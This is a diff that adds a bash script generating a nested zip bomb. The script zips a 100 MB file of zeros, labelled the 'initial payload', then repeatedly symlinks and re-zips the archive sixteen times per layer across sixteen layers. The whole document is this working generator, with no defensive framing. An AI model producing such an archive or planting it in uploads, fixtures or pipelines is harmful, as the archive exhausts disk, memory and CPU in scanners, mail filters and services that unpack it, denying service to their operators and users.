@@ -1,0 +1,21 @@
+#!/usr/bin/env bash
+
+# cleanup
+rm -f ./*.zip
+
+# initial payload
+dd if=/dev/zero of="0" bs=100M count=1
+zip -m "00.zip" 0
+
+# build layers
+for i in $(seq 0 15); do
+	for j in $(seq 0 15); do
+		ix="$(printf '%02d' "$i")"
+		jx="$(printf '%02d' "$j")"
+		ln -s "$ix.zip" "$ix-$jx.zip"
+	done
+
+	next="$(printf "%02d" "$((i + 1))")"
+	zip -9 -m "$next.zip" ./*-*
+	rm "$ix.zip"
+done
